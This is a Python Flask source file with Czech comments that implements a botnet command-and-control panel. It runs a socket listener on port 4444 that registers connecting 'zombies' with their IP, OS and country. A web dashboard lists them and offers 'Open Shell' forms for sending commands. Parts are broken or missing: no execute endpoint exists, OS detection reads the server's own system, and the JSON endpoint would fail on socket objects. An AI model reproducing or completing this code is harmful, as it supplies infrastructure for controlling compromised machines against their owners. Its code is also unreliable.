from flask import Flask, render_template_string, request, jsonify
import socket
import pickle
import threading
import time
import os
import platform
import geocoder

app = Flask(__name__)

# Základní nastavení
bot_list = {}  # Klíče jsou bot ID, hodnoty jsou info o botu (IP, status, OS, atd.)
server_ip = "10.0.1.12"
server_port = 4444
last_online_check = {}

# HTML Šablona kombinovaná s Flask serverem
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
        .bot-table { width: 100%; border-collapse: collapse; }
        .bot-table th, .bot-table td { padding: 8px 12px; border: 1px solid #ddd; }
        th { background-color: #4CAF50; color: white; }
        .online { color: green; }
        .offline { color: red; }
        .shell-btn { color: blue; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Zombies Online: {{ bots|length }}</h1>
    <table class="bot-table">
        <thead>
            <tr>
                <th>ID</th>
                <th>Status</th>
                <th>IP</th>
                <th>OS</th>
                <th>Shell</th>
                <th>Country</th>
            </tr>
        </thead>
        <tbody>
            {% for bot_id, bot in bots.items() %}
            <tr>
                <td>{{ bot_id }}</td>
                <td class="{{ 'online' if bot['status'] == 'Online' else 'offline' }}">{{ bot['status'] }}</td>
                <td>{{ bot['ip'] }}</td>
                <td>{{ bot['os'] }}</td>
                <td><a href="/shell-id={{ bot_id }}" class="shell-btn">🕹️ Open Shell</a></td>
                <td>{{ bot['country'] }}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
"""

# Funkce pro získání OS a informace o botech
def get_bot_info(bot_ip):
    try:
        # Získání platformy a verze systému
        os_name = platform.system() + " " + platform.version()
        country = geocoder.ip(bot_ip).country
        return {"os": os_name, "country": country}
    except:
        return {"os": "Unknown", "country": "?"}

# Funkce pro připojení klientů
def listen_for_bots():
    global bot_list
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)

    while True:
        client, address = server_socket.accept()
        bot_ip = address[0]
        bot_info = get_bot_info(bot_ip)
        bot_id = len(bot_list) + 1

        # Přidej nového bota do seznamu
        bot_list[bot_id] = {"ip": bot_ip, "status": "Online", "os": bot_info["os"], "country": bot_info["country"], "socket": client}
        
        # Pošleme zpět nějaký "OK" signál
        client.send(pickle.dumps({"status": "connected", "id": bot_id}))
        print(f"Nový bot připojen: {bot_ip} (ID: {bot_id})")

# Webová stránka pro zobrazení informací o botech
@app.route('/')
def index():
    return render_template_string(html_template, bots=bot_list)

@app.route('/shell-id=<int:bot_id>')
def shell(bot_id):
    bot = bot_list.get(bot_id)
    if bot:
        return f"<h1>Shell pro Bot {bot_id} (IP: {bot['ip']})</h1>" \
               f"<form action='/execute/{bot_id}' method='post'>" \
               f"<input type='text' name='command' placeholder='Zadej příkaz' required>" \
               f"<button type='submit'>Spustit příkaz</button>" \
               f"</form>"
    return "Bot neexistuje", 404

# HTTP endpoint pro live update
@app.route('/api/bots', methods=['GET'])
def get_bots():
    return jsonify(bot_list)

# Spuštění serveru
if __name__ == '__main__':
    threading.Thread(target=listen_for_bots, daemon=True).start()
    app.run(host='0.0.0.0', port=80, debug=True)
